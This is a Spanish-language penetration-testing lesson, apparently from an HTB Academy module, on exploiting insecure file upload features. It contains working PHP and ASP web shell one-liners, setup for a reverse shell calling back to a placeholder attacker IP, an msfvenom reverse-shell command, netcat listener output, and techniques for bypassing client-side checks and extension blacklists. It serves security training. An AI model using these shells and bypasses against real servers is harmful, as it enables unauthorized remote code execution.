---
tags:
  - HTB-Academy
  - Penetration-Tester
---

# Introducción a los Ataques de Carga de Archivos

---

La carga de archivos de usuario se ha convertido en una característica clave para la mayoría de las aplicaciones web modernas para permitir la extensibilidad de las aplicaciones web con la información del usuario. Un sitio web de redes sociales permite la carga de imágenes de perfil de usuario y otras redes sociales, mientras que un sitio web corporativo puede permitir a los usuarios cargar archivos PDF y otros documentos para uso corporativo.

Sin embargo, a medida que los desarrolladores de aplicaciones web habilitan esta función, también corren el riesgo de permitir que los usuarios finales almacenen sus datos potencialmente maliciosos en el servidor back-end de la aplicación web. Si la entrada del usuario y los archivos cargados no se filtran y validan correctamente, los atacantes pueden explotar la función de carga de archivos para realizar actividades maliciosas, como ejecutar comandos arbitrarios en el servidor de back-end para tomar el control sobre él.

Las vulnerabilidades de carga de archivos se encuentran entre las vulnerabilidades más comunes que se encuentran en aplicaciones web y móviles, como podemos ver en las últimas [Informes CVE](https://www.cvedetails.com/vulnerability-list/cweid-434/vulnerabilities.html). También notaremos que la mayoría de estas vulnerabilidades se califican como `High` o `Critical` vulnerabilidades, que muestran el nivel de riesgo causado por la carga insegura de archivos.

---

## Tipos de Ataques de Carga de Archivos

La razón más común detrás de las vulnerabilidades de carga de archivos es la validación y verificación de archivos débiles, que pueden no estar bien aseguradas para evitar tipos de archivos no deseados o podrían faltar por completo. El peor tipo posible de vulnerabilidad de carga de archivos es un `unauthenticated arbitrary file upload` vulnerabilidad. Con este tipo de vulnerabilidad, una aplicación web permite que cualquier usuario no autenticado cargue cualquier tipo de archivo, lo que lo hace a un paso de permitir que cualquier usuario ejecute código en el servidor de back-end.

Muchos desarrolladores web emplean varios tipos de pruebas para validar la extensión o el contenido del archivo cargado. Sin embargo, como veremos en este módulo, si estos filtros no son seguros, es posible que podamos eludirlos y aún así alcanzar cargas de archivos arbitrarias para realizar nuestros ataques.

El ataque más común y crítico causado por las cargas arbitrarias de archivos es `gaining remote command execution` sobre el servidor de back-end cargando un shell web o cargando un script que envía un shell inverso. Un shell web, como discutiremos en la siguiente sección, nos permite ejecutar cualquier comando que especifiquemos y se puede convertir en un shell interactivo para enumerar el sistema fácilmente y explotar aún más la red. También puede ser posible cargar un script que envía un shell inverso a un oyente en nuestra máquina y luego interactuar con el servidor remoto de esa manera.

En algunos casos, es posible que no tengamos cargas de archivos arbitrarias y que solo podamos cargar un tipo de archivo específico. Incluso en estos casos, hay varios ataques que podemos realizar para explotar la funcionalidad de carga de archivos si faltan ciertas protecciones de seguridad de la aplicación web.

Ejemplos de estos ataques incluyen:

- Introduciendo otras vulnerabilidades como `XSS` o `XXE`.
- Causando un `Denial of Service (DoS)` en el servidor de back-end.
- Sobrescribir archivos y configuraciones críticas del sistema.
- Y muchos otros.

Finalmente, una vulnerabilidad de carga de archivos no solo es causada por la escritura de funciones inseguras, sino que también es causada a menudo por el uso de bibliotecas obsoletas que pueden ser vulnerables a estos ataques. Al final del módulo, pasaremos por varios consejos y prácticas para proteger nuestras aplicaciones web contra los tipos más comunes de ataques de carga de archivos, además de recomendaciones adicionales para evitar vulnerabilidades de carga de archivos que podemos perder.

# Validación Ausente

---

El tipo más básico de vulnerabilidad de carga de archivos ocurre cuando la aplicación web `does not have any form of validation filters` en los archivos cargados, permitiendo la carga de cualquier tipo de archivo de forma predeterminada.

Con este tipo de aplicaciones web vulnerables, podemos cargar directamente nuestro shell web o script de shell inverso a la aplicación web, y luego, simplemente visitando el script cargado, podemos interactuar con nuestro shell web o enviar el shell inverso.

---

## Carga de Archivos Arbitraria

Comencemos el ejercicio al final de esta sección, y veremos un `Employee File Manager` aplicación web, que nos permite subir archivos personales a la aplicación web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_file_manager.jpg)

La aplicación web no menciona nada sobre qué tipos de archivos están permitidos, y podemos arrastrar y soltar cualquier archivo que queramos, y su nombre aparecerá en el formulario de carga, incluyendo `.php` archivos:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_file_selected_php_file.jpg)

Además, si hacemos clic en el formulario para seleccionar un archivo, el cuadro de diálogo del selector de archivos no especifica ningún tipo de archivo, como dice `All Files` para el tipo de archivo, que también puede sugerir que no se especifica ningún tipo de restricciones o limitaciones para la aplicación web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_file_selection_dialog.jpg)

Todo esto nos dice que el programa parece no tener restricciones de tipo de archivo en el front-end, y si no se especificaron restricciones en el back-end, podríamos cargar tipos de archivos arbitrarios en el servidor de back-end para obtener un control completo sobre él.

---

## Identificación de Marco Web

Necesitamos cargar un script malicioso para probar si podemos cargar cualquier tipo de archivo en el servidor de back-end y probar si podemos usar esto para explotar el servidor de back-end. Muchos tipos de scripts pueden ayudarnos a explotar aplicaciones web a través de la carga arbitraria de archivos, más comúnmente un `Web Shell` guión y a `Reverse Shell` guión.

Un Web Shell nos proporciona un método fácil para interactuar con el servidor de back-end aceptando comandos de shell e imprimiendo su salida de nuevo a nosotros dentro del navegador web. Un shell web debe escribirse en el mismo lenguaje de programación que ejecuta el servidor web, ya que ejecuta funciones y comandos específicos de la plataforma para ejecutar comandos del sistema en el servidor back-end, lo que hace que los shells web no sean scripts multiplataforma. Por lo tanto, el primer paso sería identificar qué idioma ejecuta la aplicación web.

Esto suele ser relativamente simple, ya que a menudo podemos ver la extensión de la página web en las URL, lo que puede revelar el lenguaje de programación que ejecuta la aplicación web. Sin embargo, en ciertos marcos web y lenguajes web, `Web Routes` se utilizan para asignar URL a páginas web, en cuyo caso la extensión de la página web puede no mostrarse. Además, la explotación de la carga de archivos también sería diferente, ya que nuestros archivos cargados pueden no ser directamente enrutables o accesibles.

Un método fácil para determinar qué idioma ejecuta la aplicación web es visitar el `/index.ext` page, donde cambiaríamos `ext` con varias extensiones web comunes, como `php`, `asp`, `aspx`, entre otros, para ver si alguno de ellos existe.

Por ejemplo, cuando visitamos nuestro ejercicio a continuación, vemos su URL como `http://SERVER_IP:PORT/`, como el `index` la página generalmente está oculta de forma predeterminada. Pero, si intentamos visitar `http://SERVER_IP:PORT/index.php`, obtendríamos la misma página, lo que significa que esto es realmente un `PHP` aplicación web. No necesitamos hacer esto manualmente, por supuesto, ya que podemos usar una herramienta como Burp Intruder para borrar la extensión de archivo usando un [Extensiones Web](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist, como veremos en las próximas secciones. Sin embargo, este método puede no ser siempre preciso, ya que la aplicación web puede no utilizar páginas de índice o puede utilizar más de una extensión web.

Varias otras técnicas pueden ayudar a identificar las tecnologías que ejecutan la aplicación web, como el uso de [Wappalyzer](https://www.wappalyzer.com/) extensión, que está disponible para todos los principales navegadores. Una vez añadido a nuestro navegador, podemos hacer clic en su icono para ver todas las tecnologías que ejecutan la aplicación web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_wappalyzer.jpg)

Como podemos ver, la extensión no solo nos dijo que la aplicación web se ejecuta `PHP`, pero también identificó el tipo y la versión del servidor web, el sistema operativo de back-end y otras tecnologías en uso. Estas extensiones son esenciales en el arsenal de un probador de penetración web, aunque siempre es mejor conocer métodos manuales alternativos para identificar el marco web, como el método anterior que discutimos.

También podemos ejecutar escáneres web para identificar el marco web, como escáneres Burp/ZAP u otras herramientas de Evaluación de Vulnerabilidad Web. Al final, una vez que identificamos el idioma que ejecuta la aplicación web, podemos cargar un script malicioso escrito en el mismo idioma para explotar la aplicación web y obtener control remoto sobre el servidor de back-end.

---

## Identificación de Vulnerabilidad

Ahora que hemos identificado el framework web que ejecuta la aplicación web y su lenguaje de programación, podemos probar si podemos cargar un archivo con la misma extensión. Como prueba inicial para identificar si podemos subir de forma arbitraria `PHP` archivos, creemos un básico `Hello World` script para probar si podemos ejecutar `PHP` código con nuestro archivo cargado.

Para hacerlo, escribiremos `<?php echo "Hello HTB";?>` a `test.php`, y tratar de subirlo a la aplicación web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_upload_php.jpg)

El archivo parece haber sido cargado con éxito, ya que recibimos un mensaje que dice `File successfully uploaded`, lo que significa que `the web application has no file validation whatsoever on the back-end`. Ahora, podemos hacer clic en el `Download` botón, y la aplicación web nos llevará a nuestro archivo cargado:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_hello_htb.jpg)

Como podemos ver, la página imprime nuestro `Hello HTB` mensaje, lo que significa que el `echo` la función se ejecutó para imprimir nuestra cadena, y ejecutamos con éxito `PHP` código en el servidor de back-end. Si la página no pudiera ejecutar código PHP, veríamos nuestro código fuente impreso en la página.

En la siguiente sección, veremos cómo explotar esta vulnerabilidad para ejecutar código en el servidor back-end y tomar el control sobre él.


# Subir Explotación

---

El paso final para explotar esta aplicación web es cargar el script malicioso en el mismo idioma que la aplicación web, como un shell web o un script de shell inverso. Una vez que carguemos nuestro script malicioso y visitemos su enlace, deberíamos poder interactuar con él para tomar el control del servidor de back-end.

---

## Conchas Web

Podemos encontrar muchos excelentes shells web en línea que proporcionan características útiles, como el salto de directorio o la transferencia de archivos. Una buena opción para `PHP` es [phpbash](https://github.com/Arrexel/phpbash), que proporciona un shell web semi-interactivo similar a un terminal. Además, [Seclistas](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) proporciona una gran cantidad de shells web para diferentes marcos e idiomas, que se pueden encontrar en el `/opt/useful/seclists/Web-Shells` directorio en `PwnBox`.

Podemos descargar cualquiera de estos shells web para el idioma de nuestra aplicación web (`PHP` en nuestro caso), luego cárguelo a través de la función de carga vulnerable y visite el archivo cargado para interactuar con el shell web. Por ejemplo, intentemos subir `phpbash.php` de [phpbash](https://github.com/Arrexel/phpbash) a nuestra aplicación web, y luego navegar a su enlace haciendo clic en el botón Descargar:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg)

Como podemos ver, este shell web proporciona una experiencia similar a un terminal, lo que hace que sea muy fácil enumerar el servidor de back-end para una mayor explotación. Pruebe algunos otros shells web de SecLists y vea cuáles satisfacen mejor sus necesidades.

---

## Escribir Web Shell Personalizado

Aunque el uso de shells web de recursos en línea puede proporcionar una gran experiencia, también debemos saber cómo escribir un shell web simple manualmente. Esto se debe a que es posible que no tengamos acceso a herramientas en línea durante algunas pruebas de penetración, por lo que debemos poder crear una cuando sea necesario.

Por ejemplo, con `PHP` aplicaciones web, podemos usar el `system()` función que ejecuta los comandos del sistema e imprime su salida, y pasarlo el `cmd` parámetro con `$_REQUEST['cmd']`, como sigue:

Código: php

```php
<?php system($_REQUEST['cmd']); ?>
```

Si escribimos el guión anterior a `shell.php` y subirlo a nuestra aplicación web, podemos ejecutar comandos del sistema con el `?cmd=` parámetro GET (p. ej. `?cmd=id`), como sigue:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

Esto puede no ser tan fácil de usar como otros shells web que podemos encontrar en línea, pero todavía proporciona un método interactivo para enviar comandos y recuperar su salida. Podría ser la única opción disponible durante algunas pruebas de penetración web.

**Consejo:** Si estamos utilizando este shell web personalizado en un navegador, puede ser mejor usar la vista de origen haciendo clic `[CTRL+U]`, como la vista de origen muestra la salida del comando como se mostraría en el terminal, sin ninguna representación HTML que pueda afectar la forma en que se formatea la salida.

Los shells web no son exclusivos de `PHP`y lo mismo se aplica a otros marcos web, con la única diferencia de las funciones utilizadas para ejecutar comandos del sistema. Para `.NET` aplicaciones web, podemos pasar el `cmd` parámetro con `request('cmd')` a la `eval()` función, y también debe ejecutar el comando especificado en `?cmd=` e imprima su salida, de la siguiente manera:

Código: aspa

```asp
<% eval request('cmd') %>
```

Podemos encontrar varios otros shells web en línea, muchos de los cuales se pueden memorizar fácilmente para fines de prueba de penetración web. Debe tenerse en cuenta que `in certain cases, web shells may not work`. Esto puede deberse a que el servidor web impide el uso de algunas funciones utilizadas por el shell web (por ejemplo. `system()`), o debido a un Firewall de Aplicación Web, entre otras razones. En estos casos, es posible que necesitemos usar técnicas avanzadas para evitar estas mitigaciones de seguridad, pero esto está fuera del alcance de este módulo.

---

## Shell Inverso

Finalmente, veamos cómo podemos recibir shells inversos a través de la funcionalidad de carga vulnerable. Para hacerlo, debemos comenzar descargando un script de shell inverso en el idioma de la aplicación web. Un shell inverso confiable para `PHP` es el [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) shell inverso PHP. Además, lo mismo [Seclistas](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) mencionamos anteriormente también contiene scripts de shell inverso para varios idiomas y marcos web, y podemos utilizar cualquiera de ellos para recibir un shell inverso también.

Descarguemos uno de los scripts de shell inverso anteriores, como el [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)y luego ábralo en un editor de texto para ingresar nuestro `IP` y escuchando `PORT`a qué se conectará el script. Para el `pentestmonkey` script, podemos modificar líneas `49` y `50` e ingrese el IP/PORT de nuestra máquina:

Código: php

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

A continuación, podemos empezar un `netcat` oyente en nuestra máquina (con el puerto anterior), cargue nuestro script en la aplicación web y luego visite su enlace para ejecutar el script y obtener una conexión de shell inversa:

  Subir Explotación

```shell-session
vcrdcr@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, recibimos con éxito una conexión desde el servidor de back-end que aloja la aplicación web vulnerable, lo que nos permite interactuar con ella para una mayor explotación. El mismo concepto se puede utilizar para otros marcos web y lenguajes, con la única diferencia es el script de shell inverso que utilizamos.

---

## Generando Scripts de Shell Inversos Personalizados

Al igual que los shells web, también podemos crear nuestros propios scripts de shell inversos. Si bien es posible utilizar el mismo anterior `system` funcione y páselo como un comando de shell inverso, esto puede no ser siempre muy confiable, ya que el comando puede fallar por muchas razones, al igual que cualquier otro comando de shell inverso.

Es por eso que siempre es mejor usar las funciones básicas del marco web para conectarse a nuestra máquina. Sin embargo, esto puede no ser tan fácil de memorizar como un script de shell web. Afortunadamente, herramientas como `msfvenom` puede generar un script de shell inverso en muchos idiomas e incluso puede intentar eludir ciertas restricciones vigentes. Podemos hacerlo de la siguiente manera para `PHP`:

  Subir Explotación

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

Una vez nuestro `reverse.php` se genera un script, una vez más podemos iniciar un `netcat` oyente en el puerto que especificamos anteriormente, cargue el `reverse.php` script y visita su enlace, y deberíamos recibir un shell inverso también:

  Subir Explotación

```shell-session
vcrdcr@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Del mismo modo, podemos generar scripts de shell inversos para varios idiomas. Podemos usar muchas cargas útiles de shell inversas con el `-p` marque y especifique el idioma de salida con el `-f` bandera.

Si bien los shells inversos siempre se prefieren a los shells web, ya que proporcionan el método más interactivo para controlar el servidor comprometido, es posible que no siempre funcionen, y es posible que tengamos que confiar en los shells web. Esto puede ser por varias razones, como tener un firewall en la red de back-end que impide las conexiones salientes o si el servidor web deshabilita las funciones necesarias para iniciar una conexión de nuevo a nosotros.

# Validación del Cliente

---

Muchas aplicaciones web solo se basan en el código JavaScript de front-end para validar el formato de archivo seleccionado antes de cargarlo y no lo cargarían si el archivo no está en el formato requerido (por ejemplo, no es una imagen).

Sin embargo, como la validación del formato de archivo está ocurriendo en el lado del cliente, podemos omitirla fácilmente interactuando directamente con el servidor, omitiendo por completo las validaciones frontales. También podemos modificar el código de front-end a través de las herramientas de desarrollo de nuestro navegador para deshabilitar cualquier validación en su lugar.

---

## Validación del Cliente

El ejercicio al final de esta sección muestra un básico `Profile Image` funcionalidad, que se ve con frecuencia en aplicaciones web que utilizan características de perfil de usuario, como aplicaciones web de redes sociales:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_profile_image_upload.jpg)

Sin embargo, esta vez, cuando obtenemos el cuadro de diálogo de selección de archivos, no podemos ver nuestro `PHP` scripts (o puede estar en gris), ya que el cuadro de diálogo parece estar limitado solo a formatos de imagen:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_select_file_types.jpg)

Todavía podemos seleccionar el `All Files` opción para seleccionar nuestro `PHP` script de todos modos, pero cuando lo hacemos, recibimos un mensaje de error que dice (`Only images are allowed!`), y el `Upload` el botón se desactiva:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_select_denied.jpg)

Esto indica alguna forma de validación de tipo de archivo, por lo que no podemos simplemente cargar un shell web a través del formulario de carga como lo hicimos en la sección anterior. Afortunadamente, toda la validación parece estar ocurriendo en el front-end, ya que la página nunca actualiza ni envía ninguna solicitud HTTP después de seleccionar nuestro archivo. Por lo tanto, deberíamos poder tener un control completo sobre estas validaciones del lado del cliente.

Cualquier código que se ejecute en el lado del cliente está bajo nuestro control. Si bien el servidor web es responsable de enviar el código de front-end, la representación y ejecución del código de front-end ocurren dentro de nuestro navegador. Si la aplicación web no aplica ninguna de estas validaciones en el back-end, deberíamos poder cargar cualquier tipo de archivo.

Como se mencionó anteriormente, para evitar estas protecciones, podemos `modify the upload request to the back-end server`, o podemos `manipulate the front-end code to disable these type validations`.

---

## Modificación de Solicitud de Back-end

Comencemos examinando una solicitud normal a través de `Burp`. Cuando seleccionamos una imagen, vemos que se refleja como nuestra imagen de perfil, y cuando hacemos clic en `Upload`, nuestra imagen de perfil se actualiza y persiste a través de actualizaciones. Esto indica que nuestra imagen se cargó en el servidor, que ahora nos la muestra:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_normal_request.jpg)

Si capturamos la solicitud de carga con `Burp`, vemos que la siguiente solicitud es enviada por la aplicación web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_image_upload_request.jpg)

La aplicación web parece estar enviando una solicitud de carga HTTP estándar a `/upload.php`. De esta manera, ahora podemos modificar esta solicitud para satisfacer nuestras necesidades sin tener las restricciones de validación de tipo front-end. Si el servidor de back-end no valida el tipo de archivo cargado, entonces teóricamente deberíamos poder enviar cualquier tipo de archivo/contenido, y se cargaría en el servidor.

Las dos partes importantes en la solicitud son `filename="HTB.png"` y el contenido del archivo al final de la solicitud. Si modificamos el `filename` a `shell.php` y modificar el contenido al shell web que utilizamos en la sección anterior; estaríamos subiendo un `PHP` shell web en lugar de una imagen.

Entonces, capturemos otra solicitud de carga de imagen y luego modifiquemos en consecuencia:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_modified_upload_request.jpg)

**Nota:** También podemos modificar el `Content-Type` del archivo cargado, aunque esto no debería desempeñar un papel importante en esta etapa, por lo que lo mantendremos sin modificar.

Como podemos ver, nuestra solicitud de carga se realizó y obtuvimos `File successfully uploaded` en la respuesta. Por lo tanto, ahora podemos visitar nuestro archivo cargado e interactuar con él y obtener la ejecución remota de código.

---

## Desactivar Validación Frontal

Otro método para eludir las validaciones del lado del cliente es mediante la manipulación del código front-end. Como estas funciones se están procesando completamente dentro de nuestro navegador web, tenemos un control completo sobre ellas. Por lo tanto, podemos modificar estos scripts o deshabilitarlos por completo. Luego, podemos usar la funcionalidad de carga para cargar cualquier tipo de archivo sin necesidad de utilizar `Burp` para capturar y modificar nuestras solicitudes.

Para empezar, podemos hacer clic en [`CTRL+SHIFT+C`] para alternar el navegador `Page Inspector`y luego haga clic en la imagen de perfil, que es donde activamos el selector de archivos para el formulario de carga:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_element_inspector.jpg)

Esto resaltará la siguiente entrada de archivo HTML en línea `18`:

Código: html

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Aquí, vemos que la entrada del archivo especifica (`.jpg,.jpeg,.png`) como los tipos de archivo permitidos dentro del cuadro de diálogo de selección de archivos. Sin embargo, podemos modificar esto fácilmente y seleccionar `All Files` como hicimos antes, por lo que es innecesario cambiar esta parte de la página.

La parte más interesante es `onchange="checkFile(this)"`, que parece ejecutar un código JavaScript cada vez que seleccionamos un archivo, que parece estar haciendo la validación del tipo de archivo. Para obtener los detalles de esta función, podemos ir a la del navegador `Console` haciendo clic en [`CTRL+SHIFT+K`], y luego podemos escribir el nombre de la función (`checkFile`) para obtener sus detalles:

Código: javascript

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

La clave que tomamos de esta función es donde comprueba si la extensión de archivo es una imagen, y si no lo es, imprime el mensaje de error que vimos anteriormente (`Only images are allowed!`) y deshabilita el `Upload` botón. Podemos agregar `PHP` como una de las extensiones permitidas o modificar la función para eliminar la verificación de extensión.

Afortunadamente, no necesitamos escribir y modificar el código JavaScript. Podemos eliminar esta función del código HTML ya que su uso principal parece ser la validación del tipo de archivo, y eliminarlo no debe romper nada.

Para hacerlo, podemos volver a nuestro inspector, hacer clic en la imagen de perfil de nuevo, haga doble clic en el nombre de la función (`checkFile`) en línea `18`y eliminarlo:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_removed_js_function.jpg)

**Consejo:** También puede hacer lo mismo para eliminar `accept=".jpg,.jpeg,.png"`, que debe hacer la selección de la `PHP` shell más fácil en el cuadro de diálogo de selección de archivos, aunque esto no es obligatorio, como se mencionó anteriormente.

Con el `checkFile` función eliminada de la entrada del archivo, deberíamos poder seleccionar nuestro `PHP` shell web a través del cuadro de diálogo de selección de archivos y subirlo normalmente sin validaciones, similar a lo que hicimos en el apartado anterior.

**Nota:** La modificación que hicimos al código fuente es temporal y no persistirá a través de las actualizaciones de la página, ya que solo lo estamos cambiando en el lado del cliente. Sin embargo, nuestra única necesidad es evitar la validación del lado del cliente, por lo que debería ser suficiente para este propósito.

Una vez que carguemos nuestro shell web utilizando cualquiera de los métodos anteriores y luego actualicemos la página, podemos usar el `Page Inspector` una vez más con [`CTRL+SHIFT+C`], haga clic en la imagen del perfil, y deberíamos ver la URL de nuestro shell web cargado:

Código: html

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

Si podemos hacer clic en el enlace anterior, llegaremos a nuestro shell web cargado, con el que podemos interactuar para ejecutar comandos en el servidor de back-end:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

**Nota:** Los pasos que se muestran se aplican a Firefox, ya que otros navegadores pueden tener métodos ligeramente diferentes para aplicar cambios locales a la fuente, como el uso de `overrides` en Chrome.

# Filtros de lista negra

---

En la sección anterior, vimos un ejemplo de una aplicación web que solo aplicaba controles de validación de tipo en el front-end (es decir, del lado del cliente), lo que hacía trivial eludir estos controles. Es por eso que siempre se recomienda implementar todos los controles relacionados con la seguridad en el servidor de back-end, donde los atacantes no pueden manipularlo directamente.

Aún así, si los controles de validación de tipo en el servidor de back-end no se codificaron de forma segura, un atacante puede utilizar múltiples técnicas para omitirlos y alcanzar las cargas de archivos PHP.

El ejercicio que encontramos en esta sección es similar al que vimos en la sección anterior, pero tiene una lista negra de extensiones no permitidas para evitar subir scripts web. Veremos por qué el uso de una lista negra de extensiones comunes puede no ser suficiente para evitar la carga arbitraria de archivos y discutir varios métodos para evitarlo.

---

## Extensiones de Blacklisting

Comencemos probando uno de los bypass del lado del cliente que aprendimos en la sección anterior para cargar un script PHP en el servidor de back-end. Interceptaremos una solicitud de carga de imágenes con Burp, reemplazaremos el contenido del archivo y el nombre del archivo con nuestro script PHP y reenviaremos la solicitud:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_disallowed_type.jpg)

Como podemos ver, nuestro ataque no tuvo éxito esta vez, como lo conseguimos `Extension not allowed`. Esto indica que la aplicación web puede tener alguna forma de validación de tipo de archivo en el back-end, además de las validaciones front-end.

Generalmente hay dos formas comunes de validar una extensión de archivo en el back-end:

1. Pruebas contra a `blacklist` de tipos
2. Pruebas contra a `whitelist` de tipos

Además, la validación también puede comprobar el `file type` o el `file content` para la coincidencia de tipos. La forma más débil de validación entre estos es `testing the file extension against a blacklist of extension` para determinar si la solicitud de carga debe ser bloqueada. Por ejemplo, el siguiente fragmento de código comprueba si la extensión de archivo cargada es `PHP` y deja caer la solicitud si es:

Código: php

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

El código está tomando la extensión de archivo (`$extension`) del nombre del archivo cargado (`$fileName`) y luego compararlo con una lista de extensiones en la lista negra (`$blacklist`). Sin embargo, este método de validación tiene un defecto importante. `It is not comprehensive`, como muchas otras extensiones no están incluidas en esta lista, que aún se pueden usar para ejecutar código PHP en el servidor de back-end si se cargan.

**Consejo:** La comparación anterior también es sensible a los casos, y solo está considerando extensiones en minúsculas. En los servidores de Windows, los nombres de los archivos son insensibles a los casos, por lo que podemos intentar cargar un `php` con una caja mixta (p. ej. `pHp`), que también puede omitir la lista negra, y aún debe ejecutarse como un script PHP.

Entonces, intentemos explotar esta debilidad para evitar la lista negra y cargar un archivo PHP.

---

## Extensiones de Fuzzing

Como la aplicación web parece estar probando la extensión de archivo, nuestro primer paso es borrar la funcionalidad de carga con una lista de extensiones potenciales y ver cuál de ellas devuelve el mensaje de error anterior. Cualquier solicitud de carga que no devuelva un mensaje de error, devuelva un mensaje diferente o tenga éxito al cargar el archivo, puede indicar una extensión de archivo permitida.

Hay muchas listas de extensiones que podemos utilizar en nuestro escaneo fuzzing. `PayloadsAllTheThings` proporciona listas de extensiones para [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) y [.NETO](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) aplicaciones web. También podemos usar `SecLists` lista de común [Extensiones Web](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).

Podemos usar cualquiera de las listas anteriores para nuestro escaneo fuzzing. A medida que probamos una aplicación PHP, descargaremos y utilizaremos lo anterior [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) lista. Entonces, de `Burp History`, podemos localizar nuestra última solicitud para `/upload.php`, haga clic derecho sobre él y seleccione `Send to Intruder`. De la `Positions` tab, podemos `Clear` cualquier posición establecida automáticamente y luego seleccione la `.php` extensión en `filename="HTB.php"` y haga clic en el `Add` botón para agregarlo como una posición difusa:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_burp_fuzz_extension.jpg)

Mantendremos el contenido del archivo para este ataque, ya que solo estamos interesados en borrar las extensiones de archivo. Finalmente, podemos `Load` la lista de extensiones PHP de arriba en el `Payloads` pestaña debajo `Payload Options`. También desmarcaremos el `URL Encoding` opción para evitar codificar el (`.`) antes de la extensión de archivo. Una vez hecho esto, podemos hacer clic en `Start Attack` para comenzar a fuzzing para extensiones de archivo que no están en la lista negra:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_burp_intruder_result.jpg)

Podemos ordenar los resultados por `Length`, y veremos que todas las solicitudes con el Content-Length (`193`) pasó la validación de la extensión, ya que todos respondieron `File successfully uploaded`. En contraste, el resto respondió con un mensaje de error diciendo `Extension not allowed`.

---

## Extensiones No Inclinadas en la Lista Negra

Ahora, podemos intentar cargar un archivo usando cualquiera de los `allowed extensions` desde arriba, y algunos de ellos pueden permitirnos ejecutar código PHP. `Not all extensions will work with all web server configurations`, por lo que es posible que tengamos que probar varias extensiones para obtener una que ejecute con éxito el código PHP.

Usemos el `.phtml` extensión, que los servidores web PHP a menudo permiten derechos de ejecución de código. Podemos hacer clic derecho en su solicitud en los resultados de Intruder y seleccionar `Send to Repeater`. Ahora, todo lo que tenemos que hacer es repetir lo que hemos hecho en las dos secciones anteriores cambiando el nombre del archivo para usar el `.phtml` extensión y cambio del contenido al de un shell web PHP:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php5_web_shell.jpg)

Como podemos ver, nuestro archivo parece haber sido cargado. El paso final es visitar nuestro archivo de carga, que debe estar debajo del directorio de carga de imágenes (`profile_images`), como vimos en la sección anterior. Luego, podemos probar la ejecución de un comando, que debería confirmar que omitimos con éxito la lista negra y subimos nuestro shell web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)


# Filtros de Lista Blanca

---

Como se discutió en la sección anterior, el otro tipo de validación de extensión de archivo es utilizando un `whitelist of allowed file extensions`. Una lista blanca es generalmente más segura que una lista negra. El servidor web solo permitiría las extensiones especificadas, y la lista no tendría que ser completa para cubrir extensiones poco comunes.

Aún así, hay diferentes casos de uso para una lista negra y para una lista blanca. Una lista negra puede ser útil en los casos en que la funcionalidad de carga necesita permitir una amplia variedad de tipos de archivos (por ejemplo, Administrador de archivos), mientras que una lista blanca generalmente solo se usa con funcionalidades de carga donde solo se permiten unos pocos tipos de archivos. Ambos también se pueden usar en tándem.

---

## Extensiones de Lista Blanca

Comencemos el ejercicio al final de esta sección e intentemos cargar una extensión PHP poco común, como `.phtml`, y ver si todavía somos capaces de subirlo como lo hicimos en la sección anterior:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_whitelist_message.jpg)

